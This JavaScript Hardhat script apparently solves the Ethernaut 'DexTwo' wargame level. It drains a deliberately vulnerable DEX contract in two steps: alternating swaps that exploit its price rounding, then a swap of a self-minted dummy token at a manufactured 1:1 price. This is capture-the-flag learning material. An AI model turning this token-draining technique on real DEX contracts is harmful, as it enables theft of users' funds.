// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const [player] = await ethers.getSigners();

  // connect to ethernaut instance, token addresses, and a dummy ERC20 from a previous project
  const instanceAddress = "0x7D5d4118d2Af0b3911Aa135f5Ff7265ccA9ff1cB";
  const token1Address = "0xa4d3d2DfEA5F298eC020fA96924200347Faa6944";
  const token2Address = "0xbbD44f8ab0F600D9D594600a0c0483aa415f892a";
  const dummyAddress = "0xAa0c29a5A166F0e3dBD086C8eDB8C02AD4fb2761";
  const Dex = await ethers.getContractFactory("DexTwo");
  const TSwap = await ethers.getContractFactory("SwappableTokenTwo");
  const Dummy = await ethers.getContractFactory("DM4thToken");
  const dex = await Dex.attach(instanceAddress);
  const token1 = await TSwap.attach(token1Address);
  const token2 = await TSwap.attach(token2Address);
  const dummy = await Dummy.attach(dummyAddress);
  console.log('Connected to level instance, token1 instance, token2 instance, and a dummy ERC20 instance');

  // check token balances
  let playerBalance1 = await dex.balanceOf(token1.address, player.address);
  let playerBalance2 = await dex.balanceOf(token2.address, player.address);
  let playerBalanceD = await dummy.balanceOf(player.address);
  let dexBalance1 = await dex.balanceOf(token1.address, dex.address);
  let dexBalance2 = await dex.balanceOf(token2.address, dex.address);
  let dexBalanceD = await dummy.balanceOf(dex.address);

  console.log('Starting off:')
  console.log(`Dex Token Balances:\n\tToken 1: ${dexBalance1}\n\tToken 2: ${dexBalance2}`);
  console.log(`Player Token Balances:\n\tToken 1: ${playerBalance1}\n\tToken 2: ${playerBalance2}\n`);
  console.log(`Dummy Token Balances:\n\tPlayer: ${playerBalanceD}\n\tDex: ${dexBalanceD}\n`);

  // start swapping all of 1 for 2 and vice versa
  let counter = 1;
  while (dexBalance1 != 0 && dexBalance2 != 0) {
    if (counter%2 == 0) {
      console.log(`Swapping 1 for 2\n`);
      await performSwap(player, dex, token1, token2);
    }
    else {
      console.log(`Swapping 2 for 1\n`);
      await performSwap(player, dex, token2, token1);
    }
    
    playerBalance1 = await dex.balanceOf(token1.address, player.address);
    playerBalance2 = await dex.balanceOf(token2.address, player.address);
    dexBalance1 = await dex.balanceOf(token1.address, dex.address);
    dexBalance2 = await dex.balanceOf(token2.address, dex.address);
    console.log(`Dex Token Balances:\n\tToken 1: ${dexBalance1}\n\tToken 2: ${dexBalance2}`);
    console.log(`Player Token Balances:\n\tToken 1: ${playerBalance1}\n\tToken 2: ${playerBalance2}\n`);
    counter++;
    console.log(`\n\n`);
  }
  
  if (dexBalance1 == 0) {
    console.log('Dex drained of Token 1\n\n');
    remainingToken = token2;
  }
  else {
    console.log('Dex drained of Token 2\n\n');
    remainingToken = token1;
  }
  let remainingPlayerBalance = await dex.balanceOf(remainingToken.address, player.address);
  let remainingDexBalance = await dex.balanceOf(remainingToken.address, dex.address);

  // mint the number of tokens that the dex has of the remaing token to the dex
  // this will manufacture a 1:1 swap price when we swap in the dummy token
  console.log(`Remaining Token Balances:\n\tPlayer: ${remainingPlayerBalance}\n\tDex: ${remainingDexBalance}\n`);
  console.log(`Dummy Token Balances:\n\tPlayer: ${playerBalanceD}\n\tDex: ${dexBalanceD}\n`);
  console.log(`Minting ${remainingDexBalance} Dummy Tokens to the Dex`);
  const tx1 = await dummy.connect(player).mintTokensToAddress(dex.address, remainingDexBalance, { gasLimit: 10000000 });
  await tx1.wait();

  remainingPlayerBalance = await dex.balanceOf(remainingToken.address, player.address);
  remainingDexBalance = await dex.balanceOf(remainingToken.address, dex.address);
  playerBalanceD = await dummy.balanceOf(player.address);
  dexBalanceD = await dummy.balanceOf(dex.address);
  console.log(`New Token Balances`);
  console.log(`Remaining Token Balances:\n\tPlayer: ${remainingPlayerBalance}\n\tDex: ${remainingDexBalance}\n`);
  console.log(`Dummy Token Balances:\n\tPlayer: ${playerBalanceD}\n\tDex: ${dexBalanceD}\n`);

  // swap all of the dummy token balance to the DEX to drain it of the other token because of the 1:1 swap price
console.log('Performing Swap');
  const tx2 = await dummy.connect(player).approve(dex.address, remainingDexBalance, { gasLimit: 500000 });
  await tx2.wait();
  console.log('Approval Success');
  const tx3 = await dex.connect(player).swap(dummy.address, remainingToken.address, remainingDexBalance, { gasLimit: 10000000 });
  await tx3.wait();
  console.log('Swap Success');

  remainingPlayerBalance = await dex.balanceOf(remainingToken.address, player.address);
  remainingDexBalance = await dex.balanceOf(remainingToken.address, dex.address);
  playerBalanceD = await dummy.balanceOf(player.address);
  dexBalanceD = await dummy.balanceOf(dex.address);
  console.log(`Final Token Balances`);
  console.log(`Remaining Token Balances:\n\tPlayer: ${remainingPlayerBalance}\n\tDex: ${remainingDexBalance}\n`);
  console.log(`Dummy Token Balances:\n\tPlayer: ${playerBalanceD}\n\tDex: ${dexBalanceD}\n`);
}

async function performSwap(player, dex, from, to) {
  // calc whether we should spend the whole allowance or drain the contract
  const maxAmt = await dex.balanceOf(from.address, player.address);
  const dexFromAmt = await dex.balanceOf(from.address, dex.address);
  const dexToAmt = await dex.balanceOf(to.address, dex.address);
  const maxSwapPrice = (maxAmt * dexToAmt) / dexFromAmt;
  let spendAmt;

  if (maxSwapPrice > dexToAmt) {
    spendAmt = dexFromAmt;
  }
  else {
    spendAmt = maxAmt;
  }
  const swapPrice = (spendAmt * dexToAmt) / dexFromAmt;
  console.log(`Swap Amt:\t${spendAmt}`);
  console.log(`Swap Price:\t${swapPrice}`);

  try {
    const tx1 = await dex.connect(player).approve(dex.address, spendAmt, { gasLimit: 500000 });
    await tx1.wait();
    console.log('Approval Success');
    const tx2 = await dex.connect(player).swap(from.address, to.address, spendAmt, { gasLimit: 10000000 });
    await tx2.wait();
    console.log('Swap Success');
  } catch (err) {
    console.log(err.message);
    throw(err);
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
